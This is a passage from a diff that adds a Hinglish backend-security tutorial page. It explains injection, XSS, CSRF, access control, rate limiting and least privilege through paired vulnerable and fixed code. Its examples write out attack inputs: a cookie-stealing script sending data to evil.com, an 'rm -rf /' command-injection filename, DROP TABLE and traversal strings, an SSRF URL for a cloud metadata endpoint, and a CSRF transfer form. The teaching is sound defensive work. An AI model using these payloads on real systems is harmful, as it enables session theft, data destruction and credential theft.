@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Backend Security — Backend Concepts (Hinglish)</title>
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="shell">
+
+<aside class="sidebar">
+    <div class="brand"><span class="dot"></span><span>Backend Concepts</span></div>
+    <div class="tagline">Backend engineering — first principles se. Har layer ka "andar se kaise chalta hai", architecture diagrams ke saath.</div>
+
+    <div class="nav-group">
+      <div class="nav-group-title">Handbook</div>
+      <a class="nav-link" href="index.html"><span class="num">•</span> Home</a>
+      <a class="nav-link" href="01-first-principles-roadmap.html"><span class="num">1</span> First Principles & Roadmap</a>
+      <a class="nav-link" href="02-what-is-a-backend.html"><span class="num">2</span> What Is a Backend</a>
+      <a class="nav-link" href="03-http-deep-dive.html"><span class="num">3</span> HTTP Deep-Dive</a>
+      <a class="nav-link" href="04-routing.html"><span class="num">4</span> Routing</a>
+      <a class="nav-link" href="05-serialization.html"><span class="num">5</span> Serialization & Deserialization</a>
+      <a class="nav-link" href="06-auth.html"><span class="num">6</span> Authentication & Authorization</a>
+      <a class="nav-link" href="07-validation.html"><span class="num">7</span> Validation & Transformation</a>
+      <a class="nav-link" href="08-layered-architecture.html"><span class="num">8</span> Controllers, Services, Repositories</a>
+      <a class="nav-link" href="09-rest-api-design.html"><span class="num">9</span> REST API Design</a>
+      <a class="nav-link" href="10-databases-postgres.html"><span class="num">10</span> Databases with Postgres</a>
+      <a class="nav-link" href="11-caching.html"><span class="num">11</span> Caching</a>
+      <a class="nav-link" href="12-task-queues.html"><span class="num">12</span> Task Queues & Background Jobs</a>
+      <a class="nav-link" href="13-full-text-search.html"><span class="num">13</span> Full-Text Search</a>
+      <a class="nav-link" href="14-error-handling.html"><span class="num">14</span> Error Handling & Fault Tolerance</a>
+      <a class="nav-link" href="15-configuration.html"><span class="num">15</span> Configuration Management</a>
+      <a class="nav-link" href="16-observability.html"><span class="num">16</span> Logging, Monitoring, Observability</a>
+      <a class="nav-link" href="17-graceful-shutdown.html"><span class="num">17</span> Graceful Shutdown</a>
+      <a class="nav-link active" href="18-security.html"><span class="num">18</span> Backend Security</a>
+      <a class="nav-link" href="19-scaling-part-1.html"><span class="num">19</span> Scaling & Performance I</a>
+      <a class="nav-link" href="20-scaling-part-2.html"><span class="num">20</span> Scaling & Performance II</a>
+      <a class="nav-link" href="21-concurrency.html"><span class="num">21</span> Concurrency & Parallelism</a>
+    </div>
+  </aside>
+
+  <main class="main">
+    <div class="topbar">
+      <div class="breadcrumb">MAD Concepts <span>›</span> Chapter 18</div>
+      <div class="progress-pill">18 / 21</div>
+    </div>
+
+    <div class="content">
+      <span class="chapter-badge">Injection · XSS · CSRF · Rate Limiting · TLS · Least Privilege</span>
+      <h1>Backend Security</h1>
+      <p class="subtitle">
+        Ab tak har chapter mein security ke threads bikhre hue the — CORS aur sandbox (ch 2), cookies aur IDOR
+        (ch 6), mass assignment (ch 7), SQL injection (ch 8), secrets (ch 15). Ab wo sab ek jagah, ek structure
+        mein. Aur ek central idea ke saath: <strong>security ek feature nahi hai jo add hoti hai — wo har layer
+        pe liye gaye default decisions ka nateeja hai.</strong>
+      </p>
+
+      <p style="font-size:13px;color:var(--text-dim,#a8a29e);margin-top:-8px">
+        📺 Source video 20 —
+        <a href="https://www.youtube.com/watch?v=xB1C1xZZW4k">Backend Security: Everything You Need to Know</a>
+      </p>
+
+      <div class="toc">
+        <div class="toc-title">Is chapter mein</div>
+        <ul>
+          <li><a href="#surface">1. Attack Surface — Poora Naksha</a></li>
+          <li><a href="#injection">2. Injection — Ek Hi Root Cause</a></li>
+          <li><a href="#xss">3. XSS — Aur Wo Backend Ki Problem Kyun Hai</a></li>
+          <li><a href="#csrf">4. CSRF Aur CORS — Do Alag Cheezein</a></li>
+          <li><a href="#access">5. Broken Access Control — #1 OWASP Risk</a></li>
+          <li><a href="#misconfig">6. Security Misconfiguration</a></li>
+          <li><a href="#ratelimit">7. Rate Limiting — Algorithms</a></li>
+          <li><a href="#tls">8. TLS Aur Transport</a></li>
+          <li><a href="#privilege">9. Least Privilege Aur Blast Radius</a></li>
+          <li><a href="#supply">10. Dependencies Aur Supply Chain</a></li>
+          <li><a href="#checklist">11. Security Checklist</a></li>
+          <li><a href="#takeaways">12. Key Takeaways</a></li>
+          <li><a href="#interview">13. 🎯 Interview Questions</a></li>
+        </ul>
+      </div>
+
+      <h2 id="surface">Attack Surface — Poora Naksha</h2>
+      <p>
+        "Attack surface" ka matlab hai: <strong>har wo jagah jahan bahar se kuch andar aata hai.</strong> Ch 7
+        ka trust boundary yaad karo — ye usi ka security wala roop hai.
+      </p>
+
+      <figure class="excali">
+        <svg viewBox="0 0 760 420" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Attack surface across the request path with the defence at each layer">
+          <defs>
+            <marker id="sc1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+              <path d="M0,1 L9,5 L0,9 z" fill="#d97757"/>
+            </marker>
+          </defs>
+
+          <rect x="30" y="34" width="700" height="52" rx="10" class="ex-fill-b ex-stroke ex-stroke-b"/>
+          <text x="380" y="54" class="ex-t">Transport</text>
+          <text x="380" y="74" class="ex-t-sm">TLS everywhere · HSTS · certificate validity · security headers</text>
+
+          <path d="M380,88 C378,98 382,104 380,114" class="ex-stroke" marker-end="url(#sc1)"/>
+
+          <rect x="30" y="116" width="700" height="52" rx="10" class="ex-fill-o ex-stroke"/>
+          <text x="380" y="136" class="ex-t">Edge</text>
+          <text x="380" y="156" class="ex-t-sm">rate limiting · body size cap · CORS policy · WAF · DDoS</text>
+
+          <path d="M380,170 C378,180 382,186 380,196" class="ex-stroke" marker-end="url(#sc1)"/>
+
+          <rect x="30" y="198" width="700" height="52" rx="10" class="ex-fill-g ex-stroke ex-stroke-g"/>
+          <text x="380" y="218" class="ex-t">Identity</text>
+          <text x="380" y="238" class="ex-t-sm">authN (ch 6) · session/token handling · password hashing · MFA</text>
+
+          <path d="M380,252 C378,262 382,268 380,278" class="ex-stroke" marker-end="url(#sc1)"/>
+
+          <rect x="30" y="280" width="700" height="52" rx="10" class="ex-fill-p ex-stroke ex-stroke-p"/>
+          <text x="380" y="300" class="ex-t">Application</text>
+          <text x="380" y="320" class="ex-t-sm">authZ / ownership (ch 6) · input validation (ch 7) · output encoding</text>
+
+          <path d="M380,334 C378,344 382,350 380,360" class="ex-stroke" marker-end="url(#sc1)"/>
+
+          <rect x="30" y="362" width="700" height="52" rx="10" class="ex-fill-o ex-stroke"/>
+          <text x="380" y="382" class="ex-t">Data</text>
+          <text x="380" y="402" class="ex-t-sm">parameterized queries · least-privilege DB user · encryption at rest · secrets (ch 15)</text>
+        </svg>
+        <figcaption>
+          <strong>Defence in depth</strong> — koi ek layer kaafi nahi hai. Rate limiting edge pe hai par
+          authorization application mein; WAF SQL injection ko rok sakta hai par parameterized queries usse
+          <em>possible hi nahi</em> banati hain. Har layer maanti hai ki upar wali fail ho sakti hai.
+        </figcaption>
+      </figure>
+
+      <h2 id="injection">Injection — Ek Hi Root Cause</h2>
+      <p>
+        SQL injection, command injection, NoSQL injection, LDAP injection — sabki ek hi jadd hai:
+        <strong>data ko code ki tarah interpret kar liya gaya.</strong> Jab tum user input ko ek string mein
+        jodte ho jo baad mein parse hoti hai, tum user ko us language ka <em>author</em> bana dete ho.
+      </p>
+
+      <div class="code-block">
+        <div class="code-title">SQL injection — aur asli fix<button class="copy-btn">Copy</button></div>
+        <pre><code><span class="tok-com">// ❌ String concatenation</span>
+db.<span class="tok-fn">query</span>(<span class="tok-str">`SELECT * FROM users WHERE email = '${email}'`</span>);
+
+<span class="tok-com">// input: '  OR  '1'='1</span>
+<span class="tok-com">// query: SELECT * FROM users WHERE email = '' OR '1'='1'   → SAARE users</span>
+<span class="tok-com">// input: '; DROP TABLE users; --                          → aur bhi bura</span>
+
+<span class="tok-com">// ❌ "Escaping" khud likhna — hamesha adhoora rehta hai</span>
+<span class="tok-com">// charset, unicode, aur nested contexts mein bypass nikal aate hain</span>
+
+<span class="tok-com">// ✅ PARAMETERIZED QUERY — asli fix</span>
+db.<span class="tok-fn">query</span>(<span class="tok-str">"SELECT * FROM users WHERE email = $1"</span>, [email]);
+<span class="tok-com">// Kyun ye kaam karta hai: query ka STRUCTURE database ko alag se jaata hai,</span>
+<span class="tok-com">// values alag se. Value chahe kuch bhi ho, wo VALUE hi rahegi —</span>
+<span class="tok-com">// wo kabhi SQL syntax ban hi nahi sakti. Escaping nahi, SEPARATION.</span>
+
+<span class="tok-com">// ⚠️ Par ek jagah parameterization KAAM NAHI karti — identifiers</span>
+<span class="tok-com">// Column aur table names parameterize ho hi nahi sakte:</span>
+db.<span class="tok-fn">query</span>(<span class="tok-str">`SELECT * FROM orders ORDER BY ${sortField}`</span>);   <span class="tok-com">// ← INJECTABLE</span>
+
+<span class="tok-com">// ✅ Iske liye ALLOWLIST hi ek raasta hai (ch 9 mein bola tha)</span>
+<span class="tok-kw">const</span> SORTABLE = { created_at: <span class="tok-str">"created_at"</span>, total: <span class="tok-str">"total_paise"</span> };
+<span class="tok-kw">const</span> col = SORTABLE[sortField];
+<span class="tok-kw">if</span> (!col) <span class="tok-kw">throw</span> <span class="tok-kw">new</span> <span class="tok-fn">ValidationError</span>(<span class="tok-str">"invalid sort field"</span>);
+db.<span class="tok-fn">query</span>(<span class="tok-str">`SELECT * FROM orders ORDER BY ${col}`</span>);   <span class="tok-com">// ab safe — value hamesha humari</span>
+</code></pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-title">injection ke doosre roop<button class="copy-btn">Copy</button></div>
+        <pre><code><span class="tok-com">// COMMAND INJECTION</span>
+exec(<span class="tok-str">`convert ${filename} out.png`</span>);       <span class="tok-com">// ❌ filename = "x.png; rm -rf /"</span>
+<span class="tok-fn">execFile</span>(<span class="tok-str">"convert"</span>, [filename, <span class="tok-str">"out.png"</span>]);  <span class="tok-com">// ✅ shell hi nahi hai — args array</span>
+
+<span class="tok-com">// NoSQL INJECTION — JSON body se operators aa jaate hain</span>
+db.users.<span class="tok-fn">find</span>({ email: req.body.email });
+<span class="tok-com">// ❌ body: {"email": {"$ne": null}}  → sab match kar jayenge</span>
+<span class="tok-com">// ✅ Fix: ch 7 ka schema validation — email STRING hona chahiye, object nahi</span>
+
+<span class="tok-com">// PATH TRAVERSAL (ch 4 mein zikr tha)</span>
+fs.<span class="tok-fn">readFile</span>(<span class="tok-str">`/uploads/${req.params.file}`</span>);  <span class="tok-com">// ❌ ../../etc/passwd</span>
+<span class="tok-kw">const</span> full = path.<span class="tok-fn">resolve</span>(<span class="tok-str">"/uploads"</span>, req.params.file);
+<span class="tok-kw">if</span> (!full.<span class="tok-fn">startsWith</span>(<span class="tok-str">"/uploads/"</span>)) <span class="tok-kw">throw</span> <span class="tok-kw">new</span> <span class="tok-fn">ValidationError</span>();  <span class="tok-com">// ✅</span>
+
+<span class="tok-com">// SSRF — Server-Side Request Forgery (aksar bhoola jaata hai)</span>
+fetch(req.body.webhookUrl);   <span class="tok-com">// ❌ url = "http://169.254.169.254/latest/meta-data/"</span>
+<span class="tok-com">// ← cloud metadata endpoint se IAM CREDENTIALS mil jaate hain</span>
+<span class="tok-com">// ✅ Fix: URL scheme allowlist (sirf https), resolved IP ko check karo</span>
+<span class="tok-com">//    (private/link-local ranges block), redirects follow mat karo, aur</span>
+<span class="tok-com">//    outbound calls ke liye ek egress proxy use karo.</span>
+</code></pre>
+      </div>
+
+      <h2 id="xss">XSS — Aur Wo Backend Ki Problem Kyun Hai</h2>
+      <p>
+        XSS mein attacker tumhare page ke context mein JavaScript chala deta hai — matlab wo user ke saare
+        tokens, cookies (jo <code>HttpOnly</code> nahi hain), aur actions le sakta hai. Ye "frontend ka issue"
+        lagta hai par backend do jagah zimmedaar hai: <strong>wo payload store karta hai</strong>, aur
+        <strong>wo responses ka <code>Content-Type</code> aur headers set karta hai.</strong>
+      </p>
+
+      <div class="code-block">
+        <div class="code-title">XSS — teen kism aur unka fix<button class="copy-btn">Copy</button></div>
+        <pre><code><span class="tok-com">// STORED — payload DB mein, har viewer ko chalta hai (sabse khatarnak)</span>
+<span class="tok-com">// user bio: "&lt;script&gt;fetch('//evil.com?c='+document.cookie)&lt;/script&gt;"</span>
+
+<span class="tok-com">// REFLECTED — payload URL se seedha response mein</span>
+<span class="tok-com">// /search?q=&lt;script&gt;…&lt;/script&gt;  aur server usse HTML mein echo kar deta hai</span>
+
+<span class="tok-com">// DOM-based — pura client-side (innerHTML se user input)</span>
+
+<span class="tok-com">// ── Fix ka core: OUTPUT ENCODING, input sanitization nahi ────</span>
+<span class="tok-com">// Kyun? Kyunki "safe" ka matlab CONTEXT pe depend karta hai —</span>
+<span class="tok-com">// HTML body, HTML attribute, JS string, URL — chaaron mein alag escaping.</span>
+<span class="tok-com">// Isliye storage pe nahi, RENDER ke waqt encode karo, us context ke hisaab se.</span>
+
+<span class="tok-com">// Backend ki zimmedari:</span>
+res.<span class="tok-fn">json</span>(data);   <span class="tok-com">// ✅ Content-Type: application/json — browser use HTML nahi samjhega</span>
+<span class="tok-com">// ❌ user content ko text/html mein bina encode kiye mat bhejo</span>
+
+<span class="tok-com">// Rich text (bio, comments) allow karna hai? Toh SANITIZE karo, sahi library se —</span>
+<span class="tok-com">// DOMPurify jaisi allowlist-based. Khud regex se tags hatana HAMESHA bypass hota hai.</span>
+
+<span class="tok-com">// ── Security headers — backend set karta hai ─────────────────</span>
+app.<span class="tok-fn">use</span>(<span class="tok-fn">helmet</span>());   <span class="tok-com">// sensible defaults, phir tune karo</span>
+
+Content-Security-Policy: default-src <span class="tok-str">'self'</span>; script-src <span class="tok-str">'self'</span>
+<span class="tok-com">// ← sabse strong XSS defense: inline scripts chalenge hi nahi</span>
+Strict-Transport-Security: max-age=<span class="tok-num">31536000</span>; includeSubDomains
+X-Content-Type-Options: nosniff        <span class="tok-com">// browser Content-Type guess na kare</span>
+X-Frame-Options: DENY                  <span class="tok-com">// clickjacking</span>
+Referrer-Policy: strict-origin-when-cross-origin
+</code></pre>
+      </div>
+
+      <div class="callout senior">
+        <div class="callout-title">🧠 XSS aur cookie flags ka rishta (ch 6 wapas)</div>
+        <p>
+          Ch 6 mein bola tha: <code>httpOnly</code> cookie default honi chahiye kyunki
+          <strong>CSRF ka fix hai, XSS-se-token-chori ka nahi</strong>. Yahan wo poori tarah clear hota hai —
+          XSS ho jaaye toh <code>localStorage</code> ka token ek line JS se chala jaata hai, par
+          <code>httpOnly</code> cookie JS padh hi nahi sakta. XSS phir bhi bura hai (attacker user ki taraf se
+          requests bhej sakta hai), par token permanently churaya nahi ja sakta.
+        </p>
+      </div>
+
+      <h2 id="csrf">CSRF Aur CORS — Do Alag Cheezein</h2>
+      <p>
+        Ye do concepts sabse zyada confuse kiye jaate hain. Dono browsers se related hain, par ulte kaam karte
+        hain:
+      </p>
+      <table>
+        <thead><tr><th></th><th>CORS</th><th>CSRF</th></tr></thead>
+        <tbody>
+          <tr><td>Kya hai</td><td>Ek browser <em>policy</em></td><td>Ek <em>attack</em></td></tr>
+          <tr><td>Kya rokta/karta hai</td><td>Domain A ka JS domain B ka <strong>response padhne</strong> se rokta hai</td><td>Attacker site tumhari site pe <strong>request bhejwati</strong> hai</td></tr>
+          <tr><td>Key insight</td><td>CORS request bhejne se nahi rokta — sirf padhne se</td><td>Isiliye CORS CSRF ko rok nahi sakta</td></tr>
+          <tr><td>Fix</td><td>Server allowlist se origins allow kare</td><td><code>SameSite</code> cookie + CSRF token</td></tr>
+        </tbody>
+      </table>
+
+      <div class="code-block">
+        <div class="code-title">CSRF kaise chalta hai, aur CORS kyun nahi bachata<button class="copy-btn">Copy</button></div>
+        <pre><code><span class="tok-com">// User bank.com pe logged in hai (session cookie hai).</span>
+<span class="tok-com">// Phir wo evil.com kholta hai, jisme ye chhupa hai:</span>
+&lt;form action=<span class="tok-str">"https://bank.com/transfer"</span> method=<span class="tok-str">"POST"</span>&gt;
+  &lt;input name=<span class="tok-str">"to"</span> value=<span class="tok-str">"attacker"</span>&gt;&lt;input name=<span class="tok-str">"amount"</span> value=<span class="tok-str">"50000"</span>&gt;
+&lt;/form&gt;&lt;script&gt;document.forms[<span class="tok-num">0</span>].<span class="tok-fn">submit</span>()&lt;/script&gt;
+
+<span class="tok-com">// Browser bank.com ki cookie APNE AAP attach karta hai (ch 3, ch 6).</span>
+<span class="tok-com">// Server ke liye ye ek bilkul valid, authenticated request hai.</span>
+<span class="tok-com">// CORS attacker ko RESPONSE padhne se rok dega — par usse farq hi nahi padta,</span>
+<span class="tok-com">// kyunki transfer to ho CHUKA hai. Side effect ho gaya.</span>
+
+<span class="tok-com">// ── Fix 1: SameSite cookie (aaj ka primary defense) ────────</span>
+res.<span class="tok-fn">cookie</span>(<span class="tok-str">"sid"</span>, sid, { httpOnly: <span class="tok-kw">true</span>, secure: <span class="tok-kw">true</span>, sameSite: <span class="tok-str">"lax"</span> });
+<span class="tok-com">// Lax   = cross-site POST pe cookie nahi jayegi (top-level GET pe jayegi)</span>
+<span class="tok-com">// Strict= kisi bhi cross-site request pe nahi (external links se bhi logout dikhega)</span>
+
+<span class="tok-com">// ── Fix 2: CSRF token (defense in depth) ───────────────────</span>
+<span class="tok-com">// Server ek random token deta hai; client usse HEADER mein bhejta hai.</span>
+<span class="tok-com">// Attacker wo token padh hi nahi sakta (CORS use response padhne nahi deta —</span>
+<span class="tok-com">// yahan CORS actually kaam aata hai), aur browser use apne aap attach nahi karta.</span>
+
+<span class="tok-com">// ⚠️ CORS config ki common galtiyan</span>
+app.<span class="tok-fn">use</span>(<span class="tok-fn">cors</span>({ origin: <span class="tok-str">"*"</span>, credentials: <span class="tok-kw">true</span> }));  <span class="tok-com">// ❌ browser reject bhi karega</span>
+app.<span class="tok-fn">use</span>(<span class="tok-fn">cors</span>({ origin: (o, cb) =&gt; <span class="tok-fn">cb</span>(<span class="tok-kw">null</span>, <span class="tok-kw">true</span>) }));  <span class="tok-com">// ❌ har origin reflect — "*" jaisa</span>
+app.<span class="tok-fn">use</span>(<span class="tok-fn">cors</span>({ origin: config.ALLOWED_ORIGINS, credentials: <span class="tok-kw">true</span> }));  <span class="tok-com">// ✅ allowlist</span>
+</code></pre>
+      </div>
+
+      <h2 id="access">Broken Access Control — #1 OWASP Risk</h2>
+      <p>
+        OWASP Top 10 mein ye pehle number pe hai, aur wajah simple hai: iske liye koi clever exploit nahi
+        chahiye — <strong>bas ek URL mein number badalna hai</strong>. Ch 6 ka IDOR yahi hai, ab poore roop
+        mein.
+      </p>
+
+      <div class="code-block">
+        <div class="code-title">access control ke chaar common holes<button class="copy-btn">Copy</button></div>
+        <pre><code><span class="tok-com">// ── 1. IDOR — ownership check hi nahi hai (ch 6) ───────────</span>
+<span class="tok-kw">const</span> order = <span class="tok-kw">await</span> db.orders.<span class="tok-fn">findById</span>(req.params.id);   <span class="tok-com">// ❌</span>
+<span class="tok-kw">const</span> order = <span class="tok-kw">await</span> db.orders.<span class="tok-fn">findOne</span>({ id, userId: req.ctx.user.id }); <span class="tok-com">// ✅</span>
+<span class="tok-com">// Ownership QUERY mein — tab bhoolna structurally impossible hai.</span>
+<span class="tok-com">// Aur not-found pe 404 do, 403 nahi — warna existence leak hoti hai.</span>
+
+<span class="tok-com">// ── 2. Mass assignment (ch 7) ──────────────────────────────</span>
+<span class="tok-kw">await</span> db.users.<span class="tok-fn">update</span>(id, req.body);   <span class="tok-com">// ❌ {"role":"admin"} bhej do</span>
+<span class="tok-com">// ✅ .strict() schema + explicit input model jisme role hai hi nahi</span>
+
+<span class="tok-com">// ── 3. Client se aayi identity pe bharosa ──────────────────</span>
+<span class="tok-kw">const</span> userId = req.body.userId;      <span class="tok-com">// ❌ client jo bhejega wahi</span>
+<span class="tok-kw">const</span> userId = req.ctx.user.id;      <span class="tok-com">// ✅ verified token/session se (ch 6)</span>
+
+<span class="tok-com">// ── 4. Sirf UI mein chhupana ───────────────────────────────</span>
+<span class="tok-com">// Admin button hide kar diya, par POST /admin/users abhi bhi khula hai.</span>
+<span class="tok-com">// curl UI se guzarta hi nahi. Enforcement hamesha server pe.</span>
+
+<span class="tok-com">// ── Structural fix: DEFAULT DENY ───────────────────────────</span>
+app.<span class="tok-fn">use</span>(requireAuth);                       <span class="tok-com">// sab kuch protected</span>
+app.<span class="tok-fn">use</span>(<span class="tok-str">"/public"</span>, publicRouter);           <span class="tok-com">// public EXPLICITLY whitelisted</span>
+<span class="tok-com">// Ulta karne se (default allow + har route pe auth lagana) ek din koi bhool jaata hai.</span>
+<span class="tok-com">// Default deny mein bhoolne ka nateeja "sab band" hai — jo turant pakda jaata hai.</span>
+</code></pre>
+      </div>
+
+      <div class="callout senior">
+        <div class="callout-title">🧠 OWASP API Top 10 ki bhasha — BOLA aur BFLA</div>
+        <p>
+          API security mein isi cheez ke do specific naam hain, aur interviews mein ye terminology
+          differentiate karti hai:
+        </p>
+        <ul>
+          <li><strong>BOLA</strong> — <em>Broken Object Level Authorization</em>. "Kya <em>ye</em> user
+          <em>is object</em> ko access kar sakta hai?" Fail hone ka matlab IDOR — <code>/orders/1235</code>.
+          Ye <strong>API Top 10 ka #1</strong> hai.</li>
+          <li><strong>BFLA</strong> — <em>Broken Function Level Authorization</em>. "Kya ye user <em>ye
+          operation</em> kar sakta hai?" Fail hone ka matlab: ek normal user <code>DELETE /admin/users/5</code>
+          call kar leta hai kyunki route pe role check hi nahi tha (ya sirf UI mein button chhupa tha).</li>
+        </ul>
+        <p>
+          Farq yaad rakhne ka tareeka: <strong>BOLA = galat <em>data</em> tak pahunch; BFLA = galat
+          <em>action</em> tak pahunch.</strong> Dono ke structural fixes alag hain — BOLA ke liye ownership
+          query mein, BFLA ke liye default-deny routing + role check group level pe (ch 4 ka route grouping).
+        </p>
+      </div>
+
+      <h2 id="misconfig">Security Misconfiguration</h2>
+      <p>
+        Ye OWASP list mein hamesha upar rehta hai aur sabse "boring" category hai — koi clever exploit nahi,
+        bas default settings jo kabhi badli hi nahi gayi. Aur yahi wajah hai ki ye itni baar hota hai.
+      </p>
+      <table>
+        <thead><tr><th>Misconfiguration</th><th>Kya hota hai</th><th>Fix</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><strong>Default credentials</strong></td>
+            <td><code>admin/admin</code> — scanners inhe minutes mein dhoondh lete hain</td>
+            <td>Deploy se pehle badlo; boot pe validate karo (ch 15)</td>
+          </tr>
+          <tr>
+            <td><strong>Debug mode production mein</strong></td>
+            <td>Stack traces, env vars, aur SQL queries error page pe — attacker ko poora map</td>
+            <td><code>NODE_ENV=production</code>; 5xx pe generic message (ch 14)</td>
+          </tr>
+          <tr>
+            <td><strong>Directory listing on</strong></td>
+            <td><code>/uploads/</code> khol ke sabki files dikh jaati hain</td>
+            <td>nginx <code>autoindex off</code></td>
+          </tr>
+          <tr>
+            <td><strong>Admin/tooling endpoints khule</strong></td>
+            <td><code>/metrics</code>, <code>/debug/pprof</code>, Kibana, Redis internet se reachable</td>
+            <td>Internal network/VPN pe bind karo; security group (ch 2)</td>
+          </tr>
+          <tr>
+            <td><strong>Verbose headers</strong></td>
+            <td><code>X-Powered-By: Express</code>, <code>Server: nginx/1.18.0</code> — exact version se known CVEs</td>
+            <td><code>app.disable("x-powered-by")</code>, <code>server_tokens off</code></td>
+          </tr>
+          <tr>
+            <td><strong>Cloud storage public</strong></td>
+            <td>S3 bucket public — ye ek classic real-world breach hai</td>
+            <td>Block public access default; signed URLs</td>
+          </tr>
+          <tr>
+            <td><strong>Missing security headers</strong></td>
+            <td>Koi CSP, HSTS, ya <code>nosniff</code> nahi</td>
+            <td>helmet + CSP (upar §3)</td>
+          </tr>
+          <tr>
+            <td><strong>Purani dependencies</strong></td>
+            <td>Known CVEs jinke exploits public hain</td>
+            <td>Audit automate karo (§10)</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="callout warn">
+        <div class="callout-title">⚠️ Error messages se information leak — ek subtle example</div>
+        <p>
+          Login pe "email not found" aur "wrong password" alag messages dena
+          <strong>user enumeration</strong> hai — attacker pehle valid emails ki list bana leta hai, phir
+          unhi pe credential stuffing chalata hai. Yahi baat timing pe bhi lagti hai: agar user na milne pe
+          response 5ms mein aata hai aur password galat hone pe 250ms (bcrypt), toh time se hi answer leak ho
+          jaata hai — isliye user na milne par bhi ek dummy hash chalao (ch 6). Aur signup/password-reset pe
+          bhi wahi generic response rakho.
+        </p>
+      </div>
+
+      <h2 id="ratelimit">Rate Limiting — Algorithms</h2>
+      <p>
+        Rate limiting teen alag problems solve karti hai: brute force / credential stuffing (ch 6), resource
+        abuse aur cost control, aur DoS protection. Chaar algorithms, badhti hui accuracy ke saath:
+      </p>
+
+      <table>
+        <thead><tr><th>Algorithm</th><th>Kaise</th><th>Trade-off</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><strong>Fixed window</strong></td>
+            <td>Har minute counter reset</td>
+            <td>Simple, par <em>boundary burst</em>: 59s pe 100 + 61s pe 100 = 2 second mein 200</td>
+          </tr>
+          <tr>
+            <td><strong>Sliding window log</strong></td>
+            <td>Har request ka timestamp store</td>
+            <td>Bilkul accurate, par memory heavy</td>
+          </tr>
+          <tr>
+            <td><strong>Sliding window counter</strong></td>
+            <td>Do windows ka weighted average</td>
+            <td><strong>Practical sweet spot</strong> — accurate enough, sasta</td>
+          </tr>
+          <tr>
+            <td><strong>Token bucket</strong></td>
+            <td>Tokens fixed rate se bharte hain, request ek token leti hai</td>
+            <td><strong>Bursts allow karta hai</strong> — real user behaviour se sabse zyada milta hai</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="code-block">
+        <div class="code-title">distributed rate limiting — atomicity zaroori hai<button class="copy-btn">Copy</button></div>
+        <pre><code><span class="tok-com">// ❌ Ye race condition hai — 10 instances, sab ek saath padh-likh rahe hain</span>
+<span class="tok-kw">const</span> count = <span class="tok-kw">await</span> redis.<span class="tok-fn">get</span>(key);
+<span class="tok-kw">if</span> (count &gt; LIMIT) <span class="tok-kw">return</span> reject;
+<span class="tok-kw">await</span> redis.<span class="tok-fn">incr</span>(key);
+
+<span class="tok-com">// ✅ Atomic — ek round trip, ek operation (ch 11 ka SET NX jaisa hi idea)</span>
+<span class="tok-kw">const</span> count = <span class="tok-kw">await</span> redis.<span class="tok-fn">incr</span>(key);
+<span class="tok-kw">if</span> (count === <span class="tok-num">1</span>) <span class="tok-kw">await</span> redis.<span class="tok-fn">expire</span>(key, windowSec);
+<span class="tok-kw">if</span> (count &gt; LIMIT) {
+  res.<span class="tok-fn">set</span>(<span class="tok-str">"Retry-After"</span>, windowSec);   <span class="tok-com">// ← ch 3: iske bina client aggressive retry karega</span>
+  <span class="tok-kw">return</span> res.<span class="tok-fn">status</span>(<span class="tok-num">429</span>).<span class="tok-fn">json</span>({ error: <span class="tok-str">"rate_limited"</span> });
+}
+<span class="tok-com">// Complex algorithms ke liye Redis Lua script — poori tarah atomic</span>
+
+<span class="tok-com">// ── Kis key pe limit lagao — ye choice matter karti hai ────</span>
+<span class="tok-com">// IP se       → NAT ke peeche poore office/college ko affect karta hai</span>
+<span class="tok-com">// userId se   → behtar, par login se PEHLE user hai hi nahi</span>
+<span class="tok-com">// API key se  → B2B ke liye sahi</span>
+<span class="tok-com">// ✅ Login endpoint pe: IP AUR account dono pe — do alag attacks ke liye</span>
+<span class="tok-com">//    (ek account pe brute force, aur ek IP se kai accounts pe stuffing)</span>
+
+<span class="tok-com">// ⚠️ Proxy ke peeche real IP chahiye — X-Forwarded-For (ch 2).</span>
+<span class="tok-com">//    trust proxy set nahi kiya toh sab requests 127.0.0.1 dikhengi aur</span>
+<span class="tok-com">//    limit GLOBALLY trigger hoga — ek user sabko block kar dega.</span>
+</code></pre>
+      </div>
+
+      <h2 id="tls">TLS Aur Transport</h2>
+      <ul>
+        <li><strong>HTTPS everywhere</strong> — internal service-to-service calls pe bhi. "Internal network safe
+        hai" ek purani aur galat assumption hai (zero trust ka poora point yahi hai).</li>
+        <li><strong>HSTS</strong> — <code>Strict-Transport-Security</code> browser ko batata hai ki is domain pe
+        hamesha HTTPS use karo, taaki pehle HTTP request wala downgrade window bhi bandh ho jaaye.</li>
+        <li><strong>Certificate expiry monitor karo</strong> — ye ek shockingly common outage cause hai.
+        Auto-renewal (certbot, ch 2) lagao <em>aur</em> expiry pe alert bhi (ch 16), kyunki renewal bhi fail
+        hoti hai.</li>
+        <li><strong>Encryption at rest</strong> — DB, backups, aur S3 buckets. Aur PII/card data ke liye
+        application-level encryption alag se.</li>
+        <li><strong>Purane protocols band karo</strong> — TLS 1.2+ only.</li>
+      </ul>
+
+      <h2 id="privilege">Least Privilege Aur Blast Radius</h2>
+      <p>
+        Assume karo ki ek din kuch compromise <em>hoga</em>. Sawaal ye hai: <strong>us se kitna nuksaan ho
+        sakta hai?</strong> Isko blast radius kehte hain, aur usse chhota karne ka tareeka least privilege hai.
+      </p>
+      <div class="code-block">
+        <div class="code-title">least privilege — har layer pe<button class="copy-btn">Copy</button></div>
+        <pre><code><span class="tok-com">-- DATABASE: app ko superuser mat do</span>
+<span class="tok-kw">CREATE USER</span> app_user <span class="tok-kw">WITH</span> <span class="tok-kw">PASSWORD</span> …;
+<span class="tok-kw">GRANT</span> <span class="tok-kw">SELECT</span>, <span class="tok-kw">INSERT</span>, <span class="tok-kw">UPDATE</span>, <span class="tok-kw">DELETE</span> <span class="tok-kw">ON</span> … <span class="tok-kw">TO</span> app_user;
+<span class="tok-com">-- DROP TABLE ka permission nahi → SQL injection ka nuksaan bhi limited</span>
